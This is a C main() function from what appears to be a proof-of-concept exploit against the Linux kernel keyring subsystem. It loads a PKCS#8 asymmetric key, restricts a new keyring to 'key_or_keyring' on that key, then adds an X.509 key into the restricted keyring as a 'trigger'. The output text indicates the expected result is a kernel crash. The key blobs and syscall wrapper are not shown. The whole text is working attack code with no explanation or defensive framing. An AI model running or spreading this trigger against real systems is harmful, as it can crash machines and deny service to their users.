int main(int argc, char **argv)
{
    long pkcs8_serial, my_kr, ret;
    char restriction[64];

    setvbuf(stdout, NULL, _IONBF, 0);

    (void)keyctl_(KEYCTL_JOIN_SESSION_KEYRING, 0, 0, 0, 0);

    printf("[*] add_key(asymmetric, pkcs8)...\n");
    pkcs8_serial = add_key("asymmetric", "pkcs8victim",
                           pkcs8_blob, sizeof(pkcs8_blob),
                           KEY_SPEC_SESSION_KEYRING);
    if (pkcs8_serial < 0) {
        fprintf(stderr, "add_key(pkcs8) failed: %d (%s)\n",
                errno, strerror(errno));
        return 1;
    }
    printf("[+] PKCS#8 key serial = %ld\n", pkcs8_serial);

    my_kr = add_key("keyring", "victim_kr", NULL, 0,
                    KEY_SPEC_SESSION_KEYRING);
    if (my_kr < 0) {
        fprintf(stderr, "add_key(keyring) failed: %d (%s)\n",
                errno, strerror(errno));
        return 1;
    }
    printf("[+] keyring serial = %ld\n", my_kr);

    snprintf(restriction, sizeof(restriction),
             "key_or_keyring:%ld", pkcs8_serial);
    printf("[*] keyctl(RESTRICT_KEYRING, %s)...\n", restriction);
    ret = keyctl_(KEYCTL_RESTRICT_KEYRING, my_kr,
                  (unsigned long)"asymmetric",
                  (unsigned long)restriction, 0);
    if (ret < 0) {
        fprintf(stderr, "keyctl(RESTRICT) failed: %d (%s)\n",
                errno, strerror(errno));
        return 1;
    }
    printf("[+] keyring restricted\n");

    printf("[*] add_key(asymmetric, x509) into restricted keyring -> trigger\n");
    ret = add_key("asymmetric", "trigger_x509",
                  x509_blob, sizeof(x509_blob), my_kr);
    if (ret < 0) {
        fprintf(stderr, "add_key(x509) returned: %d (%s)\n",
                errno, strerror(errno));
    } else {
        printf("[+] add_key(x509) returned serial %ld (no crash?)\n", ret);
    }
    return 0;
}
